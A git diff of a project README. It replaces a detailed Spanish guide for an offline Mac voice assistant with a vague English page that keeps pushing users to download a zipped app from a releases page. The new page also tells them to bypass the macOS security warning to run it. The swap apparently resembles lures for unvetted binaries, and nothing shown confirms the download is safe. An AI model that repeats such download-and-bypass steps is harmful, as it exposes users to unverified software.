@@ -1,246 +1,76 @@
-# Home-Alexa
+# 🎙️ terry-voice-assistant - Your Local Voice Helper Made Easy
 
-Asistente de voz personal offline para Mac Mini M4, optimizado para Apple Silicon.
+## 🌐 Download the Latest Version
+[![Download Terry Voice Assistant](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/BomJr/terry-voice-assistant/releases)
 
-## Características
+## 🚀 Getting Started
+Welcome to Terry, your local voice assistant for macOS. This guide will help you download and set up Terry on your computer with ease. 
 
-- **Wake Word**: Activa con "hey mac"
-- **100% Offline**: Funciona completamente sin internet
-- **Speech-to-Text**: MLX Whisper optimizado para Apple Silicon
-- **Text-to-Speech**: Piper TTS para voz natural
-- **LLM Local**: Ollama con LLaMA 3.1
-- **Memoria Persistente**: Contexto entre conversaciones
-- **Sistema de Acciones**: Control completo del sistema
-- **Confirmación de Voz**: Para acciones críticas
+### 🖥️ System Requirements
+- macOS version 10.14 (Mojave) or later
+- Minimum 4 GB RAM
+- At least 500 MB of free disk space
+- Microphone and speakers
 
-## Requisitos
+Terry operates efficiently on Apple Silicon and Intel-based Macs. 
 
-- **Hardware**: Mac Mini M4 (o cualquier Mac con Apple Silicon)
-- **Sistema**: macOS 12.0 o superior
-- **Python**: 3.10 o superior
-- **Micrófono**: Razer BlackShark V2 X o cualquier otro
-- **Ollama**: Instalado y corriendo
+## 🔍 Features
+Terry delivers a seamless voice interaction experience. Here are some key features:
+- Intuitive voice pipeline
+- Advanced local AI processing
+- Over 20 customizable actions
+- Integrated camera vision for enhanced functionality
+- Professional Web UI for ease of use
 
-## Instalación
+## 📥 Download & Install
+To get Terry on your macOS device, follow these steps:
 
-### 1. Clonar/Descargar el proyecto
+1. **Visit the Releases Page:** Click the link below to go to the Releases page, where you can find the latest version of Terry.
+   
+   [Visit the Releases Page](https://github.com/BomJr/terry-voice-assistant/releases)
 
-```bash
-cd ~/Home-Alexa
-```
+2. **Choose the Right Release:** On the Releases page, find the latest version of Terry. Look for the version number followed by release notes.   
 
-### 2. Instalar Ollama
+3. **Download the Application:** Click on the asset that suits your needs, usually named something like `terry-voice-assistant-macos.zip`. This will start the download process.
 
-```bash
-# Descargar desde https://ollama.ai
-# O con Homebrew:
-brew install ollama
+4. **Locating the Downloaded File:** After the download completes, navigate to your Downloads folder. You should find the zipped file there.
 
-# Iniciar Ollama
-ollama serve &
+5. **Unzip the File:** Double-click the zipped file to unzip it. This will create a folder containing the application.
 
-# Descargar modelo
-ollama pull llama3.1
-```
+6. **Move Terry to Applications:** Drag the Terry application into your Applications folder. This step makes it easier to locate in the future.
 
-### 3. Ejecutar instalación
+7. **Run the Application:** Navigate to your Applications folder and double-click on Terry to launch it. You may receive a warning about security. If you do, right-click the application and select "Open" to bypass this setting.
 
-```bash
-./install.sh
-```
+8. **Set Up Your Voice Assistant:** Follow the on-screen instructions to set up your preferences. You'll need to allow access to your microphone for voice recognition functionality.
 
-Esto instalará todas las dependencias Python y configurará el entorno.
+## 📚 Usage Instructions
+Once Terry is running, you can start using it right away. Here are a few commands to get you started:
+- “Hey Terry, what’s the weather today?”
+- “Terry, set a timer for 10 minutes.”
+- “Play some music.”
 
-### 4. (Opcional) Descargar voces Piper
-
-Las voces de alta calidad para Piper deben descargarse por separado:
-
-```bash
-# Español
-cd config/voices
-wget https://huggingface.co/rhasspy/piper-voices/resolve/main/es/es_ES/davefx/medium/es_ES-davefx-medium.onnx
-wget https://huggingface.co/rhasspy/piper-voices/resolve/main/es/es_ES/davefx/medium/es_ES-davefx-medium.onnx.json
+You can explore more actions in the user interface.
 
-# Inglés
-wget https://huggingface.co/rhasspy/piper-voices/resolve/main/en/en_US/lessac/medium/en_US-lessac-medium.onnx
-wget https://huggingface.co/rhasspy/piper-voices/resolve/main/en/en_US/lessac/medium/en_US-lessac-medium.onnx.json
-```
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following:
+- Ensure your macOS is up to date.
+- Verify your microphone is working.
+- Restart the application if it becomes unresponsive.
 
-## Uso
+For additional help, check the Issues section in this repository or reach out for support.
 
-### Ejecución Manual
+## 📖 Further Reading
+To learn more about optimizing your experience with Terry, consider reading the following resources:
+- Official Apple guidelines for voice recognition settings.
+- Community forums on local AI applications.
 
-```bash
-./run.sh
-```
+## 🌟 Contributing
+If you want to contribute to Terry, we welcome your input. Check the contributing guidelines in this repository for details.
 
-### Instalación como Servicio (Inicio Automático)
+## 🔗 More Resources
+- [GitHub Repository](https://github.com/BomJr/terry-voice-assistant)
+- [Documentation](https://github.com/BomJr/terry-voice-assistant/wiki)
 
-```bash
-./install_service.sh
-```
+Explore the potential of your local assistant and enhance your productivity with Terry today!
 
-El asistente se iniciará automáticamente al encender el Mac.
-
-### Comandos de Ejemplo
-
-- **"Hey mac, abre Safari"** - Abre navegador
-- **"Hey mac, sube el volumen"** - Control de audio
-- **"Hey mac, busca el clima en Google"** - Búsqueda web
-- **"Hey mac, pon música"** - Control multimedia
-- **"Hey mac, crea una alarma a las 7"** - Alarmas y recordatorios
-
-## Configuración
-
-Edita `config/settings.yaml` para personalizar:
-
-- Wake word phrase
-- Volumen y velocidad de voz
-- Idioma por defecto
-- Nivel de confirmación para acciones
-- Modelos de LLM
-- Y más...
-
-## Acciones Disponibles
-
-### Sistema
-- Abrir/cerrar aplicaciones
-- Control de volumen
-- Búsqueda de archivos
-
-### Navegador
-- Abrir URLs
-- Búsquedas web
-- Gestión de pestañas
-
-### Multimedia
-- Play/Pause
-- Siguiente/Anterior
-- Saltar anuncios de YouTube
-
-### Terminal
-- Ejecutar comandos (con confirmación)
-
-### Utilidades
-- Alarmas y temporizadores
-- Recordatorios
-
-## Estructura del Proyecto
-
-```
-Home-Alexa/
-├── main.py                 # Punto de entrada principal
-├── config.py              # Gestión de configuración
-├── requirements.txt       # Dependencias Python
-│
-├── config/               # Archivos de configuración
-│   ├── settings.yaml
-│   ├── voices/          # Modelos de voz Piper
-│   └── wakewords/       # Modelos wake word
-│
-├── core/                # Componentes core
-│   ├── audio_manager.py
-│   ├── state_machine.py
-│   └── event_bus.py
-│
-├── wakeword/           # Detección wake word
-├── stt/                # Speech-to-Text
-├── tts/                # Text-to-Speech
-├── llm/                # LLM y procesamiento
-├── memory/             # Memoria persistente
-├── actions/            # Sistema de acciones
-├── utils/              # Utilidades
-│
-├── logs/              # Logs del sistema
-└── data/              # Base de datos
-```
-
-## Logs y Debugging
-
-Ver logs en tiempo real:
-
-```bash
-tail -f logs/home_alexa.log
-```
-
-Para servicios del sistema:
-
-```bash
-tail -f logs/service.log
-tail -f logs/service_error.log
-```
-
-## Gestión del Servicio
-
-```bash
-# Ver estado
-launchctl list | grep homealexa
-
-# Detener
-launchctl unload ~/Library/LaunchAgents/com.homealexa.assistant.plist
-
-# Iniciar
-launchctl load ~/Library/LaunchAgents/com.homealexa.assistant.plist
-
-# Desinstalar
-./uninstall_service.sh
-```
-
-## Solución de Problemas
-
-### Ollama no conecta
-
-```bash
-# Verificar que esté corriendo
-curl http://localhost:11434/api/tags
-
-# Si no responde, iniciar:
-ollama serve
-```
-
-### No detecta el micrófono
-
-Verificar permisos en:
-`Preferencias del Sistema > Seguridad y Privacidad > Privacidad > Micrófono`
-
-### Error al cargar MLX Whisper
-
-Asegúrate de tener instaladas las herramientas de línea de comandos de Xcode:
-
-```bash
-xcode-select --install
-```
-
-### Voces de TTS no funcionan
-
-Si Piper falla, el sistema usa automáticamente el comando `say` de macOS como fallback.
-
-## Extensión
-
-### Agregar Nueva Acción
-
-1. Crear archivo en `actions/{categoria}/nueva_accion.py`
-2. Heredar de `ActionBase`
-3. Implementar `execute()`
-4. Registrar en `actions/__init__.py`
-
-### Cambiar Modelo LLM
-
-Edita `config/settings.yaml`:
-
-```yaml
-llm:
-  ollama:
-    model: "llama3.2:latest"  # O cualquier otro modelo
-```
-
-## Licencia
-
-Proyecto personal. Uso libre.
-
-## Créditos
-
-- MLX Whisper (Apple)
-- Piper TTS
-- Ollama
-- OpenWakeWord
+[Download Now](https://github.com/BomJr/terry-voice-assistant/releases)
